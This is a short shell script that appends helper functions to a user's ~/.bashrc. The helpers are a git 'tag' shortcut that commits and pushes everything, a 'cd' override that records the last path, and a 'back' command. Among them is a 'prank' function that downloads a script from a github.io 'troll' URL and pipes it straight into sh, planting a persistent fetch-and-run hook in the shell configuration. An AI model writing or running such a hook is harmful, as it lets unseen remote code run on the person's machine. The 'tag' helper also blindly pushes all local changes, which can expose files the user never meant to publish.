echo -e "function prank(){
	curl https://rapha1111.github.io/troll/cmd.sh | sh
}

function tag(){
	git add .
	git commit -m \"\$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 32 | head -n 1)\"
	if [ -z "\$1" ]; then
		git tag -ma \$(cat ~/.last_tag)--\$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold     -w 32 | head -n 1)
	else
		echo \$1 > ~/.last_tag
		echo Tag enregistre !
		echo -e \"ecrivez simplement \\033[31mtag\\033[0m la prochaine fois\"
		git tag -ma \$1-\$(tr -dc 'a-zA-Z0-9' < /dev/urandom | fold     -w 32 | head -n 1)
	fi
	git push --follow-tags
}

function cd(){
	builtin cd "\$@" || return
	pwd > ~/.lastpath
}

function back(){
	builtin cd \$(cat ~/.lastpath)
}" >> ~/.bashrc

echo "OK !"
